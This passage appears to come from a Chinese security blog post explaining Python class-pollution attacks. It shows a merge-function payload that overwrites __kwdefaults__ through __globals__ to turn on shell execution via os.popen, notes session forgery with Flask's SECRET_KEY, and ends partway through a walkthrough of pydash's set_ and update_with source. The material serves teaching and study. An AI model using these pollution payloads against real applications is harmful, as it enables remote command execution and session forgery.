<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		通过替换该属性便能实现对函数键值形参的默认值替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure>
<h2 id="5-secret_key"><a class="markdownIt-Anchor" href="#5-secret_key">#</a> 5、SECRET_KEY：</h2>
<p>​		决定 <code>flask</code>  的 <code>session</code>  生成的重要参数，知道该参数可以实现 <code>session</code>  任意伪造。</p>
<h1 id="最后的补充"><a class="markdownIt-Anchor" href="#最后的补充">#</a> 最后的补充：</h1>
<h2 id="1-merge函数"><a class="markdownIt-Anchor" href="#1-merge函数">#</a> 1、merge 函数</h2>
<p>​		首先，在最开始看到 merge 函数的时候，我当时没有仔细看过这个函数的逻辑，现在来分析下这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
<p>​		首先说一下我的知识盲区，算是因为这个，我才看不懂这个函数的源码的吧。</p>
<p>​		首先是字典的 items 方法， python 中的 items 是可以将字典中的所有项，以列表方式返回。大概情况如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.items())</span><br><span class="line"></span><br><span class="line"><span class="comment">#dict_items([(&#x27;a&#x27;, &#x27;1&#x27;), (&#x27;b&#x27;, &#x27;2&#x27;), (&#x27;c&#x27;, &#x27;123&#x27;)])</span></span><br></pre></td></tr></table></figure>
<p>​		其次就是 hasattr () 函数： <code>hasattr()</code>  是一个内置函数，用于检查对象是否具有给定的属性。这个函数接收两个参数：第一个参数是要检查的对象，第二个参数是要查找的属性名称。如果对象具有该属性，则  <code>hasattr()</code>  函数返回  <code>True</code> ，否则返回  <code>False</code> 。大概情况如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(a,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure>
<p>​		之后是 <code>__getitem__</code> 属性：在 Python 中， <code>__getitem__</code>  是一个特殊方法，用于定义对象的索引访问行为。它使得对象可以使用方括号  <code>[]</code>  进行<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEQlRTQlQkQlOUMmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">索引操作</span>，类似于列表、元组和字典等内置容器类型。</p>
<p><strong>大致上，可以通过这个属性是否存在来判断某个对象是否为字典，不过不能准确确定下来。</strong></p>
<p>​		再之后是字典的 get 方法，这个是获取字典中指定键的值，具体不做演示。</p>
<p>​		最后：setattr () 函数的功能相对比较复杂，它最基础的功能是<strong>修改类实例对象中的属性值</strong>。其次，它还可以实现<strong>为实例对象动态添加属性或者方法</strong>。示例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;321&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#123</span></span><br><span class="line"><span class="comment">#321</span></span><br></pre></td></tr></table></figure>
<p>​		好了，用下面这个做下测试，在函数里下一个断定，来调试看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">c = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">merge(a,c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>​		最开始的时候，k，v 分别获取了 a 和 1 这两个字符，然后继续向后执行，当函数执行到 <code>if hasattr(dst, '__getitem__'):</code>  的时候，如果发现有 <code>__getitem__</code> 属性，则大致判断这个是个字典，执行下一步，如果没有，则判断目标字典里是否存在 a 这一个属性，以及是否为字典，如果是字典，则递归调用，如果不是字典，则执行 else 里面的语句，设置一个全新的属性在后面。在这里因为目标字典只有 c 字段，但是源对象是一个字典，所以会进入 if，进而设置一个新的属性，也就是成功加进去了。</p>
<p>​		 <code>if dst.get(k) and type(v) == dict:</code>  这一行，检查目标字典的 k 键，也就是第一次进入时迭代获取到的 a 属性，目标是确认 a 属性是否有值，同时判断 k 是否为字典，如果 k 是字典，就递归执行。</p>
<p><strong>大概就是这样的，可能不算很详细吧，这个只有自己打断点调试才能看出来吧。</strong><br>
​</p>
<h2 id="2-pydash的set_函数源码信息"><a class="markdownIt-Anchor" href="#2-pydash的set_函数源码信息">#</a> 2、pydash 的 set_函数源码信息：</h2>
<p>​		无可奈何之下， 这里选择先审以下 set_的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string">    设置由“path”描述的对象的值。如果对象路径的任何部分不存在，它将被创建。（这里稍微有点类似于flask的ssti里面找链子的方式。）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure>
<p>​		可以发现，这个函数底层是使用的 set_with 函数，同时，这个函数会将第一个参数作为模板，将第二个参数通过点构成的类似链子的东西递归成一个对象，这种对象类似于第一个参数的类型，比如第一个参数传入的是一个字典，那么久递归成字典的形式，和它举的例子相似，这里久不进行操作了。</p>
<p>​		然后接下来就是 set_with 函数了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string">    这个方法类似于：func:`set_`，除了它接受定制器，调用customizer生成路径的对象。如果customizer返回未定义的路径，则由该方法处理路径创建</span></span><br><span class="line"><span class="string">相反。使用三个参数调用customizer：`（nested_value、key、nested_object）``</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure>
<p>​		这个函数底层调用了 update_with 函数，跟进看看，这个函数不是很能搞懂 customizer 这个参数的作业。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        这个方法类似于：func:`update`，除了它接受定制器，调用定制器生成</span></span><br><span class="line"><span class="string">		路径的对象。如果定制器返回“None”，则路径创建由以下方法处理</span></span><br><span class="line"><span class="string">		相反。使用三个参数调用定制器：“（nested_value，key，nested_object）”。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    <span class="comment">#使用 to_path_tokens(path) 将 path 转换为路径标记的列表。</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#如果解析结果不是列表，则将其转换为单元素列表。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 